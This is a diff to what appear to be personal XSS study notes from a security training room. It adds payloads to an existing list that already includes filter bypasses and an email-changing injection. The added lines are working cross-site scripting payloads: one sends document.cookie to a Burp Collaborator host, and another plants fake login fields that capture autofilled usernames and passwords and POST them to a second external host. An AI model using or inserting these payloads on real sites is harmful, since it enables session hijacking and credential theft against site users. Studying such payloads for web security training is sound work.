@@ -35,3 +35,13 @@ A popular tool for Blind XSS attacks is xsshunter. Although it's possible to mak
   - Business Logic: <script>user.changeEmail('attacker@hacker.thm');</script>
   - bypass script string replace <sscriptcript>alert('THM');</sscriptcript>
   - on image tag, /images/cat.jpg" onload="alert('THM');
+
+### XSS payload
+ - steal cookies<script>
+fetch("https://28871y2murqilrzo0kexuhsd74du1j.burpcollaborator.net",{
+method:"POST","mode": "no-cors", body:document.cookie,
+})
+</script>
+ - steal password autofill <input name=user id=user>
+<input name=pass id=pass 
+onchange="if(this.value.length)fetch('https://f4kkxbyzq4mvh4v1wxaaquoq3h99xy.burpcollaborator.net', {method: 'POST', mode:'no-cors',body: user.value+' '+this.value}),">
